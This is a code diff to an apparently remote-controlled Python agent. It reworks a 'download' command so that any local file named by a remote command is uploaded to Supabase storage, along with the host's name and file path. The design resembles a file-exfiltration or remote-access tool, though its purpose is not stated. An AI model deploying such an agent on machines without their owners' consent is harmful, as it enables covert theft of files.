@@ -1,6 +1,6 @@
 import logging
 
-logging.basicConfig(level=logging.WARNING)
+logging.basicConfig(level=logging.WARN)
 
 import os
 import time
@@ -75,37 +75,41 @@ def update_command_status(command_id, status, output='', hostname='', ip='', os=
     }).eq('id', command_id).execute()
 
 def handle_download_command(command_text):
-    """Handle the 'download' command by uploading the file to Supabase storage."""
+    """Handle the 'download' command by uploading the file to Supabase storage and updating the downloads table."""
     try:
         _, file_path = command_text.split(maxsplit=1)
 
-        # Input validation
         if not os.path.exists(file_path):
             return "Failed", f"File does not exist: {file_path}"
 
-        # Determine MIME type (optional but recommended)
         mimetype, _ = mimetypes.guess_type(file_path)
-        if not mimetype:
-            mimetype = "application/octet-stream"
-
+        mimetype = mimetype if mimetype else "application/octet-stream"
         file_name = os.path.basename(file_path)
 
-        # Upload the file
+        # Construct a path in the 'downloads' directory within the 'files' bucket
+        storage_path = f"downloads/{file_name}"
+
         with open(file_path, "rb") as f:
-            response = supabase.storage.from_(bucket_name).upload(
-                file_name, f, file_options={"content_type": mimetype}
-            )
+            response = supabase.storage.from_(bucket_name).upload(storage_path, f, file_options={"content_type": mimetype})
 
-            # Check if the upload was successful
-            if response.status_code == 200 or response.status_code == 201:
-                # Successful HTTP status for uploads
-            else:
-                # Failed upload, try to parse error message from response
-                error_data = response.json()
-                error_message = error_data.get("error", {}).get("message", "Unknown error")
-                return "Failed", f"Upload failed: {error_message}"
+        if response.status_code in [200, 201]:
+            # Construct public URL for the uploaded file
+            file_url = get_public_url(bucket_name, storage_path)
 
-        return "Completed", f"File '{file_name}' uploaded to your storage."
+            # Insert new download record into the downloads table
+            hostname, _, _ = get_system_info()
+            supabase.table('downloads').insert({
+                'hostname': hostname,
+                'local_path': file_path,
+                'remote_path': storage_path,
+                'file_url': file_url,
+                'status': 'Completed'
+            }).execute()
+
+            return "Completed", f"File uploaded and available at {file_url}"
+        else:
+            error_message = response.json().get("error", {}).get("message", "Unknown error")
+            return "Failed", f"Upload failed: {error_message}"
 
     except Exception as e:
         return "Failed", str(e)
@@ -129,8 +133,10 @@ def download_from_supabase(file_url, remote_path, supabase_key):
     if response.status_code == 200:
         with open(remote_path, 'wb') as file:
             file.write(response.content)
+        print(f"Download successful, file saved to {remote_path}")
         return True
     else:
+        print(f"Failed to download file: {response.status_code} - {response.reason}")
         return False
 
 def fetch_pending_uploads():
